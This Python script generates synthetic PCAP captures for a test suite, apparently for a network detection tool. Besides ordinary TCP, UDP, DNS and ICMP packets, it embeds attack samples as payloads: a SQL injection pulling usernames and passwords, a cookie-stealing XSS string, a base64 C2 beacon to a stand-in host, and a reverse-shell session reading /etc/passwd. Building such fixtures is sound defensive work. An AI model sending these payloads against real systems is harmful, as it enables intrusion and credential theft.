#!/usr/bin/env python3
"""
generate_sample_pcap.py — create synthetic PCAP files for testing.

Generates a realistic mix of TCP, UDP, ICMP, and DNS packets using dpkt
so the test suite has deterministic, reproducible captures without
needing real traffic captures.

Usage
-----
    python scripts/generate_sample_pcap.py
    # → writes data/samples/sample.pcap (50 packets by default)

    python scripts/generate_sample_pcap.py --count 200 --out data/samples/big.pcap
"""

from __future__ import annotations

import argparse
import socket
import struct
import time
from pathlib import Path

import dpkt

# ── Helpers ───────────────────────────────────────────────────────────────────

def _mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _ip4(s: str) -> bytes:
    return socket.inet_aton(s)


def _build_eth(src_mac: str, dst_mac: str, payload: bytes, ethertype: int = 0x0800) -> bytes:
    eth = dpkt.ethernet.Ethernet()
    eth.src = _mac(src_mac)
    eth.dst = _mac(dst_mac)
    eth.type = ethertype
    eth.data = payload
    return bytes(eth)


def _build_tcp(
    src_ip: str, dst_ip: str, sport: int, dport: int,
    flags: int = dpkt.tcp.TH_SYN, seq: int = 1000, payload: bytes = b"",
) -> bytes:
    tcp = dpkt.tcp.TCP()
    tcp.sport = sport
    tcp.dport = dport
    tcp.seq = seq
    tcp.ack = 0
    tcp.flags = flags
    tcp.win = 65535
    tcp.data = payload
    tcp.off = 5

    ip = dpkt.ip.IP()
    ip.v = 4
    ip.hl = 5
    ip.src = _ip4(src_ip)
    ip.dst = _ip4(dst_ip)
    ip.p = dpkt.ip.IP_PROTO_TCP
    ip.ttl = 64
    ip.data = tcp
    ip.len = len(ip)
    return bytes(ip)


def _build_udp(
    src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes = b"\x00" * 8,
) -> bytes:
    udp = dpkt.udp.UDP()
    udp.sport = sport
    udp.dport = dport
    udp.data = payload
    udp.ulen = 8 + len(payload)

    ip = dpkt.ip.IP()
    ip.v = 4
    ip.hl = 5
    ip.src = _ip4(src_ip)
    ip.dst = _ip4(dst_ip)
    ip.p = dpkt.ip.IP_PROTO_UDP
    ip.ttl = 64
    ip.data = udp
    ip.len = len(ip)
    return bytes(ip)


def _build_icmp(src_ip: str, dst_ip: str) -> bytes:
    icmp = dpkt.icmp.ICMP()
    icmp.type = dpkt.icmp.ICMP_ECHO
    icmp.code = 0
    icmp.data = dpkt.icmp.ICMP.Echo(id=1, seq=1, data=b"PING")

    ip = dpkt.ip.IP()
    ip.v = 4
    ip.hl = 5
    ip.src = _ip4(src_ip)
    ip.dst = _ip4(dst_ip)
    ip.p = dpkt.ip.IP_PROTO_ICMP
    ip.ttl = 64
    ip.data = icmp
    ip.len = len(ip)
    return bytes(ip)


# ── Packet recipe table ───────────────────────────────────────────────────────

SRC_MAC = "aa:bb:cc:11:22:33"
DST_MAC = "dd:ee:ff:44:55:66"


def _get_recipes():
    """Return a list of (raw_ip_bytes, description) tuples."""
    return [
        # HTTP SYN
        (_build_tcp("192.168.1.10", "93.184.216.34", 54321, 80, dpkt.tcp.TH_SYN), "TCP HTTP SYN"),
        # HTTP SYN-ACK
        (_build_tcp("93.184.216.34", "192.168.1.10", 80, 54321, dpkt.tcp.TH_SYN | dpkt.tcp.TH_ACK, seq=5000), "TCP HTTP SYN-ACK"),
        # HTTP GET payload
        (_build_tcp("192.168.1.10", "93.184.216.34", 54321, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    seq=1001, payload=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"), "TCP HTTP GET"),
        # HTTPS SYN
        (_build_tcp("192.168.1.10", "1.1.1.1", 55001, 443, dpkt.tcp.TH_SYN), "TCP HTTPS SYN"),
        # DNS query (UDP)
        (_build_udp("192.168.1.10", "8.8.8.8", 12345, 53,
                    b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                    b"\x07example\x03com\x00\x00\x01\x00\x01"), "UDP DNS query"),
        # DNS response
        (_build_udp("8.8.8.8", "192.168.1.10", 53, 12345, b"\xab\xcd\x81\x80" + b"\x00" * 20), "UDP DNS response"),
        # ICMP echo
        (_build_icmp("192.168.1.10", "8.8.8.8"), "ICMP Echo"),
        # SSH SYN
        (_build_tcp("10.0.0.5", "10.0.0.1", 61000, 22, dpkt.tcp.TH_SYN), "TCP SSH SYN"),
        # FTP SYN
        (_build_tcp("10.0.0.5", "10.0.0.1", 62000, 21, dpkt.tcp.TH_SYN), "TCP FTP SYN"),
        # NTP (UDP 123)
        (_build_udp("192.168.1.10", "129.6.15.28", 12345, 123, b"\x1b" + b"\x00" * 47), "UDP NTP"),
        # MySQL SYN
        (_build_tcp("192.168.1.50", "192.168.1.100", 41000, 3306, dpkt.tcp.TH_SYN), "TCP MySQL SYN"),
        # RDP SYN
        (_build_tcp("10.0.0.99", "10.0.0.1", 49000, 3389, dpkt.tcp.TH_SYN), "TCP RDP SYN"),
        # FIN-ACK teardown
        (_build_tcp("192.168.1.10", "93.184.216.34", 54321, 80, dpkt.tcp.TH_FIN | dpkt.tcp.TH_ACK, seq=1050), "TCP FIN-ACK"),
        # Plaintext Credential Exposure
        (_build_tcp("192.168.1.10", "192.168.1.200", 54330, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=b"POST /login HTTP/1.1\r\nHost: target-portal.local\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=SuperSecretPassword999!"), "TCP Plaintext Password"),
        # SQL Injection (SQLi) attempt
        (_build_tcp("10.0.0.99", "192.168.1.200", 49100, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=b"GET /search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users-- HTTP/1.1\r\nHost: target-portal.local\r\n\r\n"), "TCP SQL Injection"),
        # Cross-Site Scripting (XSS) payload
        (_build_tcp("10.0.0.99", "192.168.1.200", 49101, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=b"GET /comments?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\r\nHost: target-portal.local\r\n\r\n"), "TCP XSS Payload"),
        # Base64-obfuscated C2 beacon IOC
        (_build_tcp("192.168.1.10", "198.51.100.5", 54400, 8080, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=b"POST /api/telemetry HTTP/1.1\r\nHost: c2-node.net\r\n\r\ndata=aHR0cDovL21hbGljaW91cy1jMi1zZXJ2ZXIueHl6L2JlYWNvbi5waHA/aWQ9MTMzNw==\r\n"), "TCP Base64 C2 Payload"),
        # Metasploit Reverse Shell session on port 4444
        (_build_tcp("10.0.0.99", "192.168.1.15", 4444, 50123, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=b"whoami\nid\n/bin/sh -i\ncat /etc/passwd\n"), "TCP Metasploit C2 Shell"),
        # High entropy shellcode payload on non-TLS port
        (_build_tcp("10.0.0.99", "192.168.1.15", 55221, 1337, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
                    payload=bytes([(x * 17 + 43) % 256 for x in range(512)])), "High Entropy Shellcode"),
    ]


# ── Writer ────────────────────────────────────────────────────────────────────

def generate_pcap(out_path: Path, count: int = 50) -> None:
    recipes = _get_recipes()
    out_path.parent.mkdir(parents=True, exist_ok=True)

    with open(out_path, "wb") as f:
        writer = dpkt.pcap.Writer(f)
        base_ts = time.time() - count * 0.05  # start ~count*50ms ago

        for i in range(count):
            ip_bytes, _desc = recipes[i % len(recipes)]
            eth_bytes = _build_eth(SRC_MAC, DST_MAC, ip_bytes)
            ts = base_ts + i * 0.05  # 50ms inter-packet gap
            writer.writepkt(eth_bytes, ts=ts)

    print(f"[+] Written {count} packets -> {out_path}")


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Generate a synthetic test PCAP file.")
    ap.add_argument("--count", type=int, default=50, help="Number of packets to generate.")
    ap.add_argument("--out", type=Path, default=Path("data/samples/sample.pcap"),
                    help="Output PCAP path.")
    args = ap.parse_args()
    generate_pcap(args.out, args.count)
